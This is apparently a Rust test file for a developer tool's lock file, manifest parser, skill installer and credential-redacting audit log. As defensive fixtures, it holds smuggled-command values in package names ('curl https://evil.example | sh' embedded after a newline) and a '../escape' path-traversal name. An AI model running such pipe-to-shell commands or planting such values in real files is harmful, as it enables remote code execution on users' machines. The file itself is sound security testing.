//! Spec 141 FR-026 and FR-028 (T-R4b-U12, U13): the lock file and the local audit log.
//!
//! The lock is written from names a repository chooses, so a name cannot add lines to it and the
//! write cannot go through a symlink the repository commits. The audit log records what was called,
//! where and whether it was allowed, not what the code said; the opt-in that keeps payloads is
//! operator-only.

use iris_agentic_dev_core::iris::audit_log::{
    mode_report, payloads_enabled, scrub_params, scrub_params_with, AuditLog, AuditLogEntry,
};
use iris_agentic_dev_core::iris::config_sources::operator_settings;
use iris_agentic_dev_core::manifest::parse_manifest;
use iris_agentic_dev_core::manifest::resolve::{PackageLock, ResolveLock};
use serde_json::json;
use tempfile::TempDir;

const SENTINEL: &str = "Zq9-SENTINEL-pw";

// ── lock file ────────────────────────────────────────────────────────────────────────────

fn lock_with(name: &str, repository: &str) -> ResolveLock {
    ResolveLock {
        packages: vec![PackageLock {
            name: name.to_string(),
            version: "1.0.0".to_string(),
            repository: repository.to_string(),
            checksum: None,
        }],
    }
}

#[test]
fn a_name_with_a_newline_cannot_add_lines_to_the_lock() {
    let evil = "a\ncurl https://evil.example | sh\n#";
    let text = lock_with(evil, "https://example.com/#\n[[package]]\nname = \"x\"").to_toml();
    let parsed: toml::Table = toml::from_str(&text)
        .unwrap_or_else(|e| panic!("the lock must stay valid TOML ({e}):\n{text}"));
    let packages = parsed["package"].as_array().expect("[[package]] array");
    assert_eq!(
        packages.len(),
        1,
        "one package in, one package out:\n{text}"
    );
    assert_eq!(packages[0]["name"].as_str(), Some(evil));
    assert_eq!(
        parsed["metadata"]["format-version"].as_integer(),
        Some(1),
        "{text}"
    );
}

#[test]
fn control_characters_and_quotes_round_trip_through_the_lock() {
    for name in ["q\"uote", "back\\slash", "tab\there", "bell\u{7}", "é-密码"] {
        let text = lock_with(name, "https://example.com").to_toml();
        let parsed: toml::Table = toml::from_str(&text).unwrap();
        assert_eq!(parsed["package"][0]["name"].as_str(), Some(name), "{text}");
    }
}

#[test]
fn a_checksum_is_written_when_there_is_one_and_omitted_when_there_is_not() {
    let mut lock = lock_with("p", "https://example.com");
    assert!(!lock.to_toml().contains("checksum"));
    lock.packages[0].checksum = Some("abc123".to_string());
    let parsed: toml::Table = toml::from_str(&lock.to_toml()).unwrap();
    assert_eq!(parsed["package"][0]["checksum"].as_str(), Some("abc123"));
}

#[test]
fn the_manifest_parser_refuses_a_dependency_name_with_a_control_character() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("iris-agentic-dev.toml");
    std::fs::write(
        &path,
        "[package]\nname = \"p\"\nversion = \"1.0.0\"\n\n\
         [dependencies.\"a\\ncurl x | sh\\n#\"]\nversion = \"1.0.0\"\nrepository = \"/tmp\"\n",
    )
    .unwrap();
    let err = parse_manifest(&path).unwrap_err().to_string();
    assert!(err.contains("INVALID_MANIFEST"), "{err}");
}

#[test]
fn the_manifest_parser_still_takes_an_ordinary_name() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("iris-agentic-dev.toml");
    std::fs::write(
        &path,
        "[package]\nname = \"p\"\nversion = \"1.0.0\"\n\n\
         [dependencies.good-dep]\nversion = \"1.0.0\"\nrepository = \"/tmp\"\n",
    )
    .unwrap();
    let m = parse_manifest(&path).unwrap();
    assert!(m.dependencies.contains_key("good-dep"));
}

#[cfg(unix)]
#[test]
fn a_copilot_install_through_a_symlinked_directory_writes_nothing_outside_the_repository() {
    use iris_agentic_dev_core::skill_install::{install_skill, InstallOutcome, InstallTarget};
    let dir = TempDir::new().unwrap();
    let repo = dir.path().join("repo");
    let outside = dir.path().join("outside");
    std::fs::create_dir_all(repo.join(".github")).unwrap();
    std::fs::create_dir_all(&outside).unwrap();
    std::os::unix::fs::symlink(&outside, repo.join(".github").join("instructions")).unwrap();

    let target = InstallTarget::for_copilot("some-skill", &repo);
    let results = install_skill(
        "some-skill",
        "---\nname: some-skill\n---\nbody\n",
        &[target],
        false,
    );

    assert_eq!(results.len(), 1);
    assert!(
        matches!(results[0].outcome, InstallOutcome::Failed(_)),
        "{:?}",
        results[0].outcome
    );
    assert_eq!(
        std::fs::read_dir(&outside).unwrap().count(),
        0,
        "nothing may be created outside the repository"
    );
}

#[test]
fn a_skill_name_with_a_path_separator_is_refused() {
    use iris_agentic_dev_core::skill_install::{install_skill, InstallOutcome, InstallTarget};
    let dir = TempDir::new().unwrap();
    let target = InstallTarget::for_copilot("../escape", dir.path());
    let results = install_skill("../escape", "---\nname: x\n---\n", &[target], false);
    assert!(
        matches!(results[0].outcome, InstallOutcome::Failed(_)),
        "{:?}",
        results[0].outcome
    );
    assert!(!dir.path().join("escape.instructions.md").exists());
}

// ── audit log ────────────────────────────────────────────────────────────────────────────

fn entry(params: serde_json::Value) -> AuditLogEntry {
    AuditLogEntry {
        ts: "2026-10-23T12:00:00Z".into(),
        tool: "iris_execute".into(),
        connection: "dev".into(),
        namespace: "USER".into(),
        status: "allowed".into(),
        gate: None,
        allowed_categories: None,
        params,
    }
}

fn written(
    log: &AuditLog,
    path: &std::path::Path,
    e: &AuditLogEntry,
) -> (String, serde_json::Value) {
    log.write(e).unwrap();
    let text = std::fs::read_to_string(path).unwrap();
    let v = serde_json::from_str(text.lines().last().unwrap()).unwrap();
    (text, v)
}

#[test]
fn the_default_log_holds_no_credential_and_no_payload() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("audit.jsonl");
    let log = AuditLog::new(path.clone());
    let params = json!({
        "code": format!("Do ##class(Security.Users).Create(\"u\",,\"{SENTINEL}\")\nWrite 1"),
        "args": {"password": SENTINEL},
        "nested": {"apiKey": SENTINEL, "ok": "kept"},
        "namespace": "USER",
    });
    let (text, v) = written(&log, &path, &entry(params));

    assert!(!text.contains(SENTINEL), "sentinel in the log: {text}");
    let p = &v["params"];
    assert_eq!(p["code"]["redacted"], true);
    assert_eq!(p["code"]["lines"], 2);
    assert!(p["code"]["chars"].as_u64().unwrap() > 40, "{p}");
    assert_eq!(p["args"]["redacted"], true, "{p}");
    assert_eq!(p["nested"]["apiKey"], "[REDACTED]");
    assert_eq!(p["nested"]["ok"], "kept");
    assert_eq!(p["namespace"], "USER");
}

#[cfg(unix)]
#[test]
fn the_log_is_owner_only() {
    use std::os::unix::fs::PermissionsExt;
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("iad").join("audit.jsonl");
    let log = AuditLog::new(path.clone());
    log.write(&entry(json!({}))).unwrap();
    let mode = |p: &std::path::Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode(&path), 0o600);
    assert_eq!(mode(path.parent().unwrap()), 0o700);
}

#[test]
fn payload_keys_are_sized_wherever_they_appear() {
    let scrubbed = scrub_params(json!({
        "items": [{"query": "SELECT 1\nFROM t"}, {"sql": ""}],
        "deep": {"content": "abc", "value": 42, "args": [1, 2]},
    }));
    assert_eq!(
        scrubbed["items"][0]["query"],
        json!({"redacted": true, "chars": 15, "lines": 2})
    );
    assert_eq!(
        scrubbed["items"][1]["sql"],
        json!({"redacted": true, "chars": 0, "lines": 0})
    );
    assert_eq!(scrubbed["deep"]["content"]["chars"], 3);
    assert_eq!(scrubbed["deep"]["value"]["redacted"], true);
    assert_eq!(scrubbed["deep"]["args"]["redacted"], true);
}

#[test]
fn credential_keys_match_by_suffix_ignoring_case_and_separators() {
    let scrubbed = scrub_params(json!({
        "Password": "x", "db_password": "x", "api-key": "x", "apiKey": "x", "x_secret": "x",
        "accessToken": "x", "passphrase": "x", "passwd": "x",
        "max_tokens": 100, "host": "h",
    }));
    for k in [
        "Password",
        "db_password",
        "api-key",
        "apiKey",
        "x_secret",
        "accessToken",
        "passphrase",
        "passwd",
    ] {
        assert_eq!(scrubbed[k], "[REDACTED]", "{k} must be redacted");
    }
    assert_eq!(scrubbed["max_tokens"], 100, "a count of tokens is not one");
    assert_eq!(scrubbed["host"], "h");
}

#[test]
fn the_opt_in_keeps_payloads_but_still_redacts_credential_keys() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("audit.jsonl");
    let log = AuditLog::new(path.clone()).with_payloads(true);
    let params = json!({
        "code": "Write 1",
        "args": {"password": SENTINEL, "n": 1},
        "query": "SELECT 1",
    });
    let (text, v) = written(&log, &path, &entry(params));
    assert!(!text.contains(SENTINEL), "{text}");
    assert_eq!(v["params"]["code"], "Write 1");
    assert_eq!(v["params"]["query"], "SELECT 1");
    assert_eq!(v["params"]["args"]["password"], "[REDACTED]");
    assert_eq!(v["params"]["args"]["n"], 1);
}

#[test]
fn scrub_params_with_matches_the_two_modes() {
    let p = json!({"code": "x"});
    assert_eq!(scrub_params_with(p.clone(), true)["code"], "x");
    assert_eq!(
        scrub_params_with(p.clone(), false)["code"]["redacted"],
        true
    );
    assert_eq!(scrub_params(p)["code"]["redacted"], true);
}

// ── where the opt-in may come from ───────────────────────────────────────────────────────

fn operator(toml_text: &str) -> iris_agentic_dev_core::iris::config_sources::OperatorSettings {
    operator_settings(&toml_text.parse::<toml::Table>().unwrap())
}

#[test]
fn the_operator_file_turns_payloads_on() {
    assert!(payloads_enabled(&operator("audit_payloads = true\n"), None));
    assert!(!payloads_enabled(
        &operator("audit_payloads = false\n"),
        None
    ));
    assert!(!payloads_enabled(&operator(""), None));
}

#[test]
fn the_environment_turns_payloads_on_only_for_a_truthy_value() {
    let off = operator("");
    for on in ["1", "true", "TRUE", "yes"] {
        assert!(payloads_enabled(&off, Some(on)), "{on}");
    }
    for no in ["", "0", "false", "no", "maybe"] {
        assert!(!payloads_enabled(&off, Some(no)), "{no:?}");
    }
}

#[test]
fn check_config_reports_the_audit_mode() {
    let sizes = mode_report(false, std::path::Path::new("/tmp/a.jsonl"));
    assert_eq!(sizes["payloads"], "sizes");
    assert_eq!(sizes["path"], "/tmp/a.jsonl");
    let full = mode_report(true, std::path::Path::new("/tmp/a.jsonl"));
    assert_eq!(full["payloads"], "full");
}
